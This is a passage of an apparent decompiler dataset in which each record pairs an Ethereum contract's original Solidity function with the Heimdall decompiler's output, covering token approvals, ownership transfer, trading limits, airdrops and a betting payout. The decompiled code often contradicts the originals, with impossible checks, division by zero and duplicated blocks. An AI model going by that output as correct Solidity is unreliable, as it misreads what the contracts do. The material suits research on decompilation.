\"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        uint256 var_k = var_c.length;\n        require(!(bytes1(var_c.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_l = (~((0x0100 ** (0x20 - (bytes1(var_c.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        require(0x084595161401484a000000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x05;\n        var_f = address(storage_map_k[var_f] / 0x01);\n        var_g = 0x01;\n        var_c = 0x40 + var_c;\n        var_a = 0x1e;\n        var_i = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(storage_map_j[var_f] > store_g), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_k = var_c.length;\n        require(!(bytes1(var_c.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = (~((0x0100 ** (0x20 - (bytes1(var_c.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_c = 0x40 + var_c;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x084595161401484a000000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_k = var_c.length;\n        require(!(bytes1(var_c.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = (~((0x0100 ** (0x20 - (bytes1(var_c.length)))) - 0x01)) & (var_m);\n        var_l = var_n;\n        if (0x084595161401484a000000) {\n            require(0x084595161401484a000000);\n        }\n        var_f = address(arg0);\n        var_g = 0x04;\n        storage_map_j[var_f] = (0x01 * 0x01) | (uint248(storage_map_j[var_f]));\n        store_h = store_h + 0x01;\n        var_f = 0x05;\n        storage_map_o[var_f] = (address(arg0) * 0x01) | (uint96(storage_map_o[var_f]));\n    }"}
{"contract_address": "0x31b60867a6203e76120df0612769ba136097eBc8", "original_solidity_code": "function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd548c6Cf03b82450db5a446845DB3005e34138eE", "original_solidity_code": "function startTrading() public onlyOwner {\r\n        TradingOpen = true;\r\n        buypercent = 200;\r\n        sellpercent = 200;\r\n        transferpercent = 0;\r\n                              \r\n    }", "heimdall_decompiled_code": "function startTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        pair = 0x010000000000000000000000000000000000000000 | (uint248(pair));\n        store_u = 0xc8;\n        store_v = 0xc8;\n        store_w = 0;\n    }"}
{"contract_address": "0x03eB7Fe6801893F6006127B5248809e8CFbdd89D", "original_solidity_code": "function CloseBetting(uint256 _betting_id) public {\\n        (\\n            ,\\n            uint256 bet_id_in_all_bet_list\\n        ) = bet_id_by_user(_betting_id, msg.sender);\\n\\n        bool better = false;\\n        Betting storage betting = bettings[_betting_id];\\n\\n        if (bets[bet_id_in_all_bet_list].betting_id == _betting_id && bets[bet_id_in_all_bet_list].amount > 0 ) {\\n            better = true;\\n        }\\n        \\n        if( betting.creater == msg.sender){\\n            better = true;\\n        }\\n\\n        require(\\n            better == true,\\n            \\\"only betters or creater can close betting @ CloseBetting()\\\"\\n        );\\n\\n        require(\\n            betting.status == Status.Open,\\n            \\\"Betting is not open @ CloseBetting()\\\"\\n        );\\n        require(\\n            block.timestamp >= betting.pendingTime,\\n            \\\"Betting pendingTime has not passed yet @ CloseBetting()\\\"\\n        );\\n        require(\\n            block.timestamp >= betting.endTime,\\n            \\\"Betting endTime has not passed yet @ CloseBetting()\\\"\\n        );\\n\\n        uint256 token_decimails;\\n        address oracle_address;\\n\\n        // get token decimals\\n        for (uint256 i = 0; i <= SupportedTokenCount; i++) {\\n            if (\\n                supported_tokens[i].token == betting.token &&\\n                supported_tokens[i].valid == true\\n            ) {\\n                token_decimails = supported_tokens[i].decimails;\\n                oracle_address = supported_tokens[i].oracle_address;\\n            }\\n        }\\n\\n        better_oracle = BettingOracle_ChainLink(oracle_address);\\n\\n        (uint256 _correctPrice, ) = better_oracle\\n            .fetch_closest_price_to_timestamp(\\n                betting.token,\\n                betting.endTime,\\n                token_decimails\\n            );\\n\\n        //to do: use oracle to replace this line\\n        bettings[_betting_id].correctPrice = _correctPrice;\\n\\n        bool hasWinner = false;\\n\\n        uint256 all_winner_bet_amount = 0;\\n\\n        uint256 correct_price_range = (_correctPrice * range_percentage) / 200;\\n\\n        uint256 correct_price_upper_bond = _correctPrice + correct_price_range;\\n\\n        uint256 correct_price_lower_bond = _correctPrice - correct_price_range;\\n\\n        //loop current betting to calculate winners\\n        for (uint256 i = 0; i <= betCount; i++) {\\n            if (bets[i].betting_id == _betting_id) {\\n                if (bets[i].amount != 0) {\\n                    // meet the price range\\n                    if (\\n                        bets[i].predictedPrice >= correct_price_lower_bond &&\\n                        bets[i].predictedPrice <= correct_price_upper_bond\\n                    ) {\\n                        bets[i].winner = true;\\n                        hasWinner = true;\\n\\n                        all_winner_bet_amount += bets[i].amount;\\n                    }\\n                }\\n            }\\n        }\\n\\n        //loop current betting to calculate winning ratio and winning amount\\n        if (hasWinner == true) {\\n            for (uint256 i = 0; i <= betCount; i++) {\\n                if (bets[i].betting_id == _betting_id) {\\n                    if (bets[i].winner == true) {\\n                        //uint256 winnings_ratio = (bets[i].amount * ratio_decimails )/ all_winner_bet_amount;\\n\\n                        //bets[i].winningsRatio = (bets[i].amount * ratio_decimails )/ all_winner_bet_amount;\\n                        //bets[i].winningsAmount = (((bets[i].amount * ratio_decimails )/ all_winner_bet_amount) * (bettings[_betting_id].totalAmount - all_winner_bet_amount)) / ratio_decimails;\\n                        bets[i].winningsRatio = calculate_winningsRatio(\\n                            i,\\n                            all_winner_bet_amount\\n                        );\\n                        bets[i].winningsAmount = calculate_winningsAmount(\\n                            _betting_id,\\n                            i,\\n                            all_winner_bet_amount\\n                        );\\n                    }\\n                }\\n            }\\n        }\\n\\n        //betting is closed, waiting for user to claim winnings\\n        betting.status = Status.Pending;\\n        betting.hadWinner = hasWinner;\\n    }", "heimdall_decompiled_code": "function CloseBetting(uint256 arg0) public payable {\n        require(0 > betCount, \"Betting is not open @ CloseBetting()\");\n        uint256 var_a = arg0;\n        var_b = 0x05;\n        var_a = 0;\n        var_b = 0x06;\n        require(!(arg0 == (storage_map_b[var_a])), \"Betting is not open @ CloseBetting()\");\n        require(!(arg0 == (storage_map_b[var_a])), \"Betting is not open @ CloseBetting()\");\n        require(address(storage_map_k[var_a]) - msg.sender, \"Betting is not open @ CloseBetting()\");\n        require(0 == 0x01, \"Betting is not open @ CloseBetting()\");\n        require(!(bytes1(storage_map_l[var_a]) > 0x02), \"Betting is not open @ CloseBetting()\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x21;\n        require(bytes1(storage_map_l[var_a]) == 0, \"Betting is not open @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x42657474696e67206973206e6f74206f70656e204020436c6f73654265747469;\n        var_h = 0x6e67282900000000000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp < (storage_map_e[var_a])), \"Betting pendingTime has not passed yet @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x37;\n        var_g = 0x42657474696e672070656e64696e6754696d6520686173206e6f742070617373;\n        var_h = 0x656420796574204020436c6f736542657474696e672829000000000000000000;\n        require(!(block.timestamp < (storage_map_m[var_a])), \"Betting endTime has not passed yet @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x33;\n        var_g = 0x42657474696e6720656e6454696d6520686173206e6f74207061737365642079;\n        var_h = 0x6574204020436c6f736542657474696e67282900000000000000000000000000;\n        require(0 > SupportedTokenCount);\n        better_oracle = 0 | (uint96(better_oracle));\n        var_d = 0xb09a57a900000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = address(storage_map_o[var_a]);\n        uint256 var_f = storage_map_g[var_a];\n        uint256 var_g = 0;\n        (bool success, bytes memory ret0) = address(0).Unresolved_b09a57a9(var_e); // call\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x40);\n        require(var_j == (uint80(var_j)));\n        var_a = arg0;\n        var_b = 0x05;\n        storage_map_p[var_a] = var_i.length;\n        if ((range_percentage == ((range_percentage * var_i.length) / var_i.length)) | !var_i.length) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (0xc8) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x12;\n                if (!var_i.length > (((range_percentage * var_i.length) / 0xc8) + var_i.length)) {\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require((range_percentage == ((range_percentage * var_i.length) / var_i.length)) | !var_i.length);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require(0xc8);\n                    require(!var_i.length > (((range_percentage * var_i.length) / 0xc8) + var_i.length));\n                    require(!(var_i.length - ((range_percentage * var_i.length) / 0xc8)) > var_i.length);\n                    storage_map_c[var_a] = (uint240(storage_map_c[var_a]) | (0x0100 * 0)) | 0x01;\n                    var_a = 0;\n                    var_b = 0x06;\n                    require(0 > betCount);\n                    require(0x01 - 0);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require(0 > betCount);\n                    storage_map_c[var_a] = (uint240(storage_map_c[var_a]) | (0x0100 * 0)) | 0x01;\n                    var_a = 0;\n                    var_b = 0x06;\n                    require(storage_map_b[var_a] - arg0);\n                    var_a = 0;\n                    var_b = 0x06;\n                    require(0x01);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require(0x01 - (bytes1(storage_map_e[var_a])));\n                    var_a = 0;\n                    var_b = 0x06;\n                    storage_map_r[var_a] = (store_s * (storage_map_m[var_a])) / 0;\n                    var_a = arg0;\n                    var_b = 0x05;\n                    require((store_s == ((store_s * (storage_map_m[var_a])) / (storage_map_m[var_a]))) | (!storage_map_m[var_a]));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    var_a = 0;\n                    var_b = 0x06;\n                    require(0);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require(!(storage_map_t[var_a] - 0) > (storage_map_t[var_a]));\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x12;\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x12;\n                    storage_map_c[var_a] = (uint240(storage_map_c[var_a]) | (0x0100 * 0)) | 0x01;\n                    var_a = 0;\n                    var_b = 0x06;\n                    require((store_s == ((store_s * (storage_map_m[var_a])) / (storage_map_m[var_a]))) | (!storage_map_m[var_a]));\n                    require(0);\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_c = 0x11;\n                    require(storage_map_b[var_a] - arg0);\n                }\n            }\n            var_a = 0;\n            var_b = 0x06;\n            require(0x01);\n            var_a = 0;\n            var_b = 0x06;\n            require(!storage_map_m[var_a]);\n            var_a = 0;\n            var_b = 0x06;\n            require((var_i.length - ((range_percentage * var_i.length) / 0xc8)) > (storage_map_u[var_a]));\n            var_a = 0;\n            var_b = 0x06;\n            storage_map_i[var_a] = 0x01 | (uint248(storage_map_i[var_a]));\n            require((((range_percentage * var_i.length) / 0xc8) + var_i.length) < (storage_map_u[var_a]));\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            require(!0 > (storage_map_g[var_a] + 0));\n        }\n        var_a = 0;\n        var_b = 0x07;\n        if (!(address(storage_map_o[var_a])) == (address(storage_map_b[var_a]))) {\n            if (!(address(storage_map_o[var_a])) == (address(storage_map_b[var_a]))) {\n            }\n            var_a = 0;\n            var_b = 0x07;\n            require(!(address(storage_map_o[var_a]) == (address(storage_map_b[var_a]))), \"only betters or creater can close betting @ CloseBetting()\");\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3a;\n        var_g = 0x6f6e6c792062657474657273206f7220637265617465722063616e20636c6f73;\n        var_h = 0x652062657474696e67204020436c6f736542657474696e672829000000000000;\n        require(0x01 == 0x01, \"only betters or creater can close betting @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x3a;\n        var_g = 0x6f6e6c792062657474657273206f7220637265617465722063616e20636c6f73;\n        var_h = 0x652062657474696e67204020436c6f736542657474696e672829000000000000;\n        require(!(bytes1(storage_map_l[var_a]) > 0x02), \"Betting is not open @ CloseBetting()\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x21;\n        require(bytes1(storage_map_l[var_a]) == 0, \"Betting is not open @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x42657474696e67206973206e6f74206f70656e204020436c6f73654265747469;\n        var_h = 0x6e67282900000000000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp < (storage_map_e[var_a])), \"Betting pendingTime has not passed yet @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x37;\n        var_g = 0x42657474696e672070656e64696e6754696d6520686173206e6f742070617373;\n        var_h = 0x656420796574204020436c6f736542657474696e672829000000000000000000;\n        require(!(block.timestamp < (storage_map_m[var_a])), \"Betting endTime has not passed yet @ CloseBetting()\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x33;\n        var_g = 0x42657474696e6720656e6454696d6520686173206e6f74207061737365642079;\n        var_h = 0x6574204020436c6f736542657474696e67282900000000000000000000000000;\n        require(0 > SupportedTokenCount);\n        better_oracle = 0 | (uint96(better_oracle));\n        var_d = 0xb09a57a900000000000000000000000000000000000000000000000000000000;\n        var_e = address(storage_map_o[var_a]);\n        var_f = storage_map_g[var_a];\n        var_g = 0;\n        (bool success, bytes memory ret0) = address(0).Unresolved_b09a57a9(var_e); // call\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x40);\n        require(var_j == (uint80(var_j)));\n        if (address(storage_map_k[var_a]) - msg.sender) {\n        }\n        var_a = 0;\n        var_b = 0x06;\n        if (!storage_map_m[var_a]) {\n        }\n        var_a = 0;\n        var_b = 0x06;\n        if (storage_map_b[var_a] - arg0) {\n            var_a = 0;\n            var_b = 0x06;\n            require(storage_map_b[var_a] - arg0);\n        }\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function removeCompetitveUser(address _address) external onlyOwner {\\r\\n        require(COMPETITIVE_WHITELIST_ADDRESSES[_address], \\\"Address is not on the competitive whitelist\\\");\\r\\n        delete COMPETITIVE_WHITELIST_CLAIMED[_address]; \\r\\n        delete COMPETITIVE_WHITELIST_ADDRESSES[_address];\\r\\n    }", "heimdall_decompiled_code": "function removeCompetitveUser(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x22;\n        require(bytes1(storage_map_aj[var_e]), \"Address is not on the competitive whitelist\");\n        var_e = address(arg0);\n        var_f = 0x23;\n        storage_map_aj[var_e] = 0;\n        var_f = 0x22;\n        storage_map_aj[var_e] = uint248(storage_map_aj[var_e]);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2b;\n        var_d = 0x41646472657373206973206e6f74206f6e2074686520636f6d70657469746976;\n        var_g = 0x652077686974656c697374000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf579fAba7EE17180e7e52E9D49774cC07220D5e3", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function airdropToWallets(address[] memory wallets, uint256[] memory amountsInTokens) external onlyOwner {\r\n        require(wallets.length == amountsInTokens.length, \"arrays must be the same length\");\r\n        require(wallets.length < 600, \"Can only airdrop 600 wallets per txn due to gas limits\"); // allows for airdrop + launch at the same exact time, reducing delays and reducing sniper input.\r\n        for(uint256 i = 0; i < wallets.length; i++){\r\n            address wallet = wallets[i];\r\n            uint256 amount = amountsInTokens[i];\r\n            super._transfer(msg.sender, wallet, amount);\r\n        }\r\n    }", "heimdall_decompiled_code": "function airdropToWallets(address[] arg0, uint256[] arg1) public {\n        require(!arg0 > 0xffffffffffffffff);\n        require(!(arg0) > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x41;\n        require(!((var_c + (uint248((0x20 + (arg0 << 0x05)) + 0x1f))) < var_c) | ((var_c + (uint248((0x20 + (arg0 << 0x05)) + 0x1f))) > 0xffffffffffffffff));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x41;\n        uint256 var_c = var_c + (uint248((0x20 + (arg0 << 0x05)) + 0x1f));\n        uint256 var_d = (arg0);\n        require(!(0x20 + (0x04 + arg0)) < (0x20 + ((0x04 + arg0) + (arg0 << 0x05))));\n        require((0x20 + (arg0)) == (address(0x20 + (arg0))));\n        require(!arg1 > 0xffffffffffffffff);\n        require(!(arg1 > 0xffffffffffffffff), \"Ownable: caller is not the owner\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x41;\n        require(!(((var_c + (uint248((0x20 + (arg1 << 0x05)) + 0x1f))) < var_c) | ((var_c + (uint248((0x20 + (arg1 << 0x05)) + 0x1f))) > 0xffffffffffffffff)), \"Ownable: caller is not the owner\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x41;\n        var_c = var_c + (uint248((0x20 + (arg1 << 0x05)) + 0x1f));\n        address var_e = (arg1);\n        require(!(((0x04 + arg1) + 0x20) < (0x20 + ((0x04 + arg1) + (arg1 << 0x05)))), \"Ownable: caller is not the owner\");\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x20;\n        var_i = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(var_c.length == var_c.length, \"arrays must be the same length\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1e;\n        var_i = 0x617272617973206d757374206265207468652073616d65206c656e6774680000;\n        require(var_c.length < 0x0258, \"Can only airdrop 600 wallets per txn due to gas limits\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x36;\n        var_i = 0x43616e206f6e6c792061697264726f70203630302077616c6c65747320706572;\n        var_j = 0x2074786e2064756520746f20676173206c696d69747300000000000000000000;\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(var_k), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_l = 0;\n        require(!(storage_map_c[var_a] < (var_k)), \"ERC20: transfer amount exceeds balance\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x26;\n        var_i = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_l = 0;\n        storage_map_c[var_a] = storage_map_c[var_a] - (var_k);\n        var_a = address(var_k);\n        require(!(storage_map_c[var_a] > (var_k + storage_map_c[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        storage_map_c[var_a] = (var_k) + storage_map_c[var_a];\n        var_f = var_k;\n        emit Transfer(address(msg.sender), address(var_k), var_k);\n        require(0x01, \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x23;\n        var_i = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x25;\n        var_i = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x32;\n    }"}
{"contract_address": "0x31d3341342D2A7a68EDDF5759C820eFD568D91dA", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        emit OwnershipTransferred(_owner, newOwner);\\n        _owner = newOwner;\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x19d4B93c60e5D7995226F47446e56bD6ac2DDD75", "original_solidity_code": "function isBot(address a) public view returns (bool){\n      return bots[a];\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function allowance(address owner, address spender) public view returns(uint) {\r\n \r\n        return _allowances[owner][spender];\r\n \r\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        var_a = 0x07;\n        address var_b = address(arg0);\n        address var_a = keccak256(var_b);\n        var_b = address(arg1);\n        address var_c = storage_map_l[var_b];\n        return storage_map_l[var_b];\n    }"}
{"contract_address": "0x8f3d46713d90363a242CE2506d6866FEfCf00302", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        transferDelayEnabled=false;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if (!0x3b9aca00 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = (0 * 0x01) | 